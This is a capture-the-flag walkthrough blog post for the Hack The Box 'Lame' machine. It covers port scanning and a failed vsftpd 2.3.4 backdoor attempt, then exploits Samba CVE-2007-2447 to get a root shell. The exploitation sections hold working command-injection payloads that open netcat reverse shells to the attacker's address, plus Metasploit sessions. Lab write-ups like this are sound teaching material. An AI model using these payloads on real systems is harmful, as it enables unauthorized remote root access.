---
title:
  "HTB - Lame"
date: 2021-04-25T01:00:27+02:00
cover:
  src: cover.png
draft: false
comments: true
socialShare: true
tags:
  - HTB
  - Lame

aliases:
  - HTB-Lame

---

## Overview

Lame is a beginner-friendly Linux machine and the first box released on Hack The Box (HTB). It leverages the Samba "username map script" vulnerability (CVE-2007-2447) to gain both user and root access. This walkthrough covers the exploitation process with and without Metasploit, along with an analysis of the vulnerabilities.


## Machine Details

- **Author**: [ch4p](https://www.hackthebox.eu/home/users/profile/1)
- **Type**: Linux
- **Difficulty**: 2.7/10


## Reconnaissance

### Nmap Scan

A full TCP and UDP port scan reveals the following open ports:

```
┌──(kali㉿kali)-[~]
└─$ nmap -sT -p- --min-rate 10000 10.10.10.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 00:02 EST
Nmap scan report for 10.10.10.3
Host is up (0.52s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 131.64 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ nmap -sU -p- --min-rate 10000 10.10.10.3   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 12:11 EST
Nmap scan report for 10.10.10.3
Host is up (1.3s latency).
Not shown: 65531 open|filtered udp ports (no-response)
PORT     STATE  SERVICE
22/udp   closed ssh
139/udp  closed netbios-ssn
445/udp  closed microsoft-ds
3632/udp closed distcc

Nmap done: 1 IP address (1 host up) scanned in 53.81 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ nmap -p 21,22,139,445,3632 -sC -sV 10.10.10.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 12:14 EST
Nmap scan report for 10.10.10.3
Host is up (0.64s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h32m09s, deviation: 3h32m12s, median: 2m05s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-03-07T12:16:29-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.94 seconds
```

### Results:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distccd     distccd v1 (GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)
```

## FTP Enumeration

The FTP service on port 21 allows anonymous logins, which is a common misconfiguration that can sometimes lead to unauthorized access or information disclosure. However, in this case, the directory accessible via anonymous login is empty.

```
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.10.3    
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||33180|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> 
```

## Exploiting VSFTPd 2.3.4 Backdoor (CVE-2011-2523)

The VSFTPd version 2.3.4 is infamous for containing a backdoor that allows remote command execution. This backdoor was intentionally inserted into the code and can be exploited under certain conditions. However, in the case of the Lame machine, the backdoor is not remotely exploitable due to firewall restrictions.

```
┌──(kali㉿kali)-[~]                                                                                                 │
└─$ searchsploit vsftpd 2.3.4                                                                                       │
---------------------------------------------------------------------------------- ---------------------------------│
 Exploit Title                                                                    |  Path                           │
---------------------------------------------------------------------------------- ---------------------------------│
vsftpd 2.3.4 - Backdoor Command Execution                                         | unix/remote/49757.py            │
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                            | unix/remote/17491.rb            │
---------------------------------------------------------------------------------- ---------------------------------│
Shellcodes: No Results
```
The output shows a Metasploit module (`exploits/unix/remote/17491.rb`) that can be used to exploit the backdoor.

### Exploit Details
The backdoor is triggered when a username ending in `:)` is sent during the FTP login process. This causes the server to open a listener on port 6200, which can be used to execute arbitrary commands.

### Manual Exploitation Attempt

1. Trigger the Backdoor:
   Connect to the FTP server and log in with a username ending in `:)`:

```
┌──(kali㉿kali)-[~]                                                                                                 
└─$ nc 10.10.10.3 21                                                                                                
                                                                                                                    
220 (vsFTPd 2.3.4)                                                                                                  
USER n3rdh4x0r:)                                                                                                    
331 Please specify the password.                                                                                    
PASS n3rdh4x0r-not-a-password
```

2. Check for Listener:
   If the backdoor is successfully triggered, the server will open a listener on port 6200. Attempt to connect to it:

```
nc 10.10.10.3 6200
```
  However, in this case, the connection fails:

```
┌──(kali㉿kali)-[~]                                                                                                 
└─$ nc 10.10.10.3 6200

(UNKNOWN) [10.10.10.3] 6200 (?) : Connection timed out
```

### Metasploit Exploitation Attempt

```
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole -q
[sudo] password for kali: 
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.10.3       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact
payload => cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```
The exploit fails because the backdoor listener is blocked by the firewall.

### Why the Exploit Fails
The backdoor listener on port 6200 is not accessible remotely due to firewall rules. This is confirmed by checking the open ports on the machine:

```
root@lame:/# netstat -tnlp | grep 6200
tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      5580/vsftpd

```
While the listener is active, it is not reachable from outside the machine.


## SSH Enumeration

The SSH service running on the target machine provides valuable information about the operating system. By examining the SSH version, we can often determine the exact distribution and version of the OS. Here's how you can use the SSH version to identify the OS:

The SSH service on the target machine is running `OpenSSH 4.7p1 Debian 8ubuntu1`. This version string contains several clues:
* OpenSSH 4.7p1: The version of OpenSSH.
* Debian: Indicates the operating system is based on Debian.
* 8ubuntu1: Suggests the OS is Ubuntu, specifically an older version.

A quick Google search for "OpenSSH 4.7p1 Debian 8ubuntu1" reveals that this version corresponds to Ubuntu 8.04 (Hardy Heron). This is an older version of Ubuntu.

![image](https://github.com/user-attachments/assets/c47a10fe-b11c-4a6f-b2e8-df1d8d8b6c93)

![image](https://github.com/user-attachments/assets/7e5de03e-c952-4da4-ac1c-0e2dc641052c)


## SMB Enumeration

Use `smbmap` to list accessible shares:

```
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.10.10.3

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                                      
                                                                                                                             
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
[*] Closed 1 connections

```
The `tmp` share is accessible with read and write permissions.

Attempt to connect to the tmp share using `smbclient`:

```
smbclient -N //10.10.10.3/tmp
```
If the connection fails due to protocol negotiation issues, modify the Samba client configuration or use the `--option` flag:

```
smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
```

Output:

```
┌──(kali㉿kali)-[~]
└─$ smbclient -N //10.10.10.3/tmp

Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar  7 14:37:13 2025
  ..                                 DR        0  Sat Oct 31 03:33:58 2020
  5561.jsvc_up                        R        0  Fri Mar  7 06:37:24 2025
  .ICE-unix                          DH        0  Fri Mar  7 06:36:13 2025
  vmware-root                        DR        0  Fri Mar  7 06:36:09 2025
  .X11-unix                          DH        0  Fri Mar  7 06:36:47 2025
  .X0-lock                           HR       11  Fri Mar  7 06:36:47 2025
  vgauthsvclog.txt.0                  R     1600  Fri Mar  7 06:36:10 2025

                7282168 blocks of size 1024. 5384656 blocks available
smb: \>
```
The tmp share is mapped to the `/tmp` directory and contains no sensitive files.


### Exploitation

Use searchsploit to find exploits for Samba 3.0:

```
┌──(kali㉿kali)-[~]                                                                                                   │
└─$ searchsploit samba 3.0                                                                                            │
------------------------------------------------------------------------------------ ---------------------------------│
 Exploit Title                                                                      |  Path                           │
------------------------------------------------------------------------------------ ---------------------------------│
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                | osx/remote/16875.rb             │
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                              | multiple/remote/10095.txt       │
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)    | unix/remote/16320.rb            │
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                  | linux/remote/9950.rb            │
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)              | linux/remote/16859.rb           │
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)            | solaris/remote/16329.rb         │
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                            | linux/dos/4732.c                │
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                   | multiple/dos/5712.pl            │
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                    | linux/remote/364.pl             │
Samba < 3.0.20 - Remote Heap Overflow                                               | linux/remote/7701.txt           │
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                       | linux_x86/dos/36741.py          │
------------------------------------------------------------------------------------ ---------------------------------│
Shellcodes: No Results
```

```
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | exploits/unix/remote/16320.rb
```
The Samba "username map script" vulnerability (CVE-2007-2447) affects Samba versions 3.0.20 to 3.0.25rc3. This vulnerability allows unauthenticated attackers to execute arbitrary commands by injecting shell metacharacters into the username field during SMB session setup. 

### Manual Exploitation

The vulnerability allows command execution by injecting shell metacharacters into the username field. For example:

```
smbclient -N //10.10.10.3/tmp -U "./=`nohup nc -e /bin/sh 10.10.14.24 443`"
```
However, this may fail due to the shell interpreting the backticks locally. To avoid this, use single quotes:

```
smbclient -N //10.10.10.3/tmp -U './=`nohup nc -e /bin/sh 10.10.14.24 443`'
```
Alternatively, use the `logon` command within an existing `smbclient` session:

```
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.24 443`"
```


```
┌──(kali㉿kali)-[~]                                                                                                   
└─$ smbclient -N //10.10.10.3/tmp                                                                                     
                                                                                                                      
Anonymous login successful                                                                                            
Try "help" to get a list of possible commands.                                                                        
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.16.8 443`"                                                               
Password:                                                                                                             
```

```
┌──(kali㉿kali)-[~]                                                                                                   
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.3] 51083
whoami
root
id
uid=0(root) gid=0(root)
```

### Python Exploit Script

We can use this python script to automate the exploitation process : https://github.com/n3rdh4x0r/CVE-2007-2447.git

```
python3 smb3.0.20.py -lh [localhost] -lp [local port] -t [target]
```

![image](https://github.com/user-attachments/assets/d1a5e6dc-4ae9-4c5f-965a-b94e06305e49)


### Metasploit Exploitation:

Load the Metasploit module for the Samba username map script vulnerability:

```
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole -q           
[sudo] password for kali: 
msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse
PAYLOAD => cmd/unix/reverse
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.16.8
LHOST => 10.10.16.8
msf6 exploit(multi/samba/usermap_script) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on 10.10.16.8:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo cq74vDDUFdos2qKf;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "cq74vDDUFdos2qKf\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.16.8:4444 -> 10.10.10.3:34648) at 2025-03-07 15:01:15 -0500

whoami
root
id
uid=0(root) gid=0(root)
```

## Post-Exploitation

### Upgrade Shell:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Retrieve Flags:

User Flag:

```
find /home -name user.txt -exec cat {} \;
```

Root Flag:

```
cat /root/root.txt
```

![image](https://github.com/user-attachments/assets/b7f63d0c-aa53-405c-8684-57112e091830)















